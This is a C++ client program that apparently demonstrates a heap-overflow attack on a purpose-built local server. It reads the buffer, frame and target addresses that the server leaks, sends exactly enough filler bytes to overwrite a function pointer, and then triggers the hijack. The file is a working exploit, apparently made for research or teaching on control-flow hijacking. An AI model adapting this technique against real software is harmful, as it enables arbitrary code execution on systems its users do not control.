/*
 * overflow_attacker.cpp — client for CFOP Primitive 1 (heap overflow)
 * ===================================================================
 * Leaks buf/frame/hijack_target, computes the buf->frame distance, then sends
 * exactly that many filler bytes followed by the 8-byte hijack_target so the
 * overflow lands on frame[0]. RESUME then triggers the hijack.
 */
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <string>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

static int sfd;
static void sendline(const std::string &s) { std::string l = s + "\n"; write(sfd, l.data(), l.size()); }
static std::string recvline() { std::string r; char c; while (read(sfd, &c, 1) == 1 && c != '\n') r += c; return r; }

int main(int argc, char **argv) {
    uint16_t port = (argc > 1) ? (uint16_t)atoi(argv[1]) : 4445;
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in sa = {}; sa.sin_family = AF_INET; sa.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    if (connect(sfd, (sockaddr *)&sa, sizeof sa) < 0) { perror("connect"); return 1; }

    printf("[ATTACKER] %s\n", recvline().c_str());        // READY banner

    sendline("INFO");
    uintptr_t buf = 0, frame = 0, hj = 0;
    recvline();                                           // "OK"
    for (std::string l; (l = recvline()) != "END" && !l.empty(); ) {
        char k[64]; unsigned long long v;
        if (sscanf(l.c_str(), "%63s %llx", k, &v) == 2) {
            if      (!strcmp(k, "buf"))           buf   = (uintptr_t)v;
            else if (!strcmp(k, "frame"))         frame = (uintptr_t)v;
            else if (!strcmp(k, "hijack_target")) hj    = (uintptr_t)v;
        }
    }
    long delta = (long)(frame - buf);
    printf("[ATTACKER] buf=%#lx frame=%#lx hijack_target=%#lx  (distance=%ld)\n",
           buf, frame, hj, delta);
    if (delta <= 0) { printf("[ATTACKER] frame not above buf; grooming failed\n"); return 1; }

    // delta filler bytes, then 8-byte little-endian hijack_target at frame[0].
    std::string hex;
    for (long i = 0; i < delta; i++) hex += "41";
    for (int i = 0; i < 8; i++) { char b[3]; snprintf(b, 3, "%02x", (unsigned)((hj >> (8 * i)) & 0xff)); hex += b; }

    sendline("SEND " + hex);
    printf("[ATTACKER] overflow (%ld filler + 8-byte ptr) -> %s\n", delta, recvline().c_str());
    sendline("RESUME");
    printf("[ATTACKER] RESUME -> %s\n", recvline().c_str());
    sendline("QUIT");
    return 0;
}
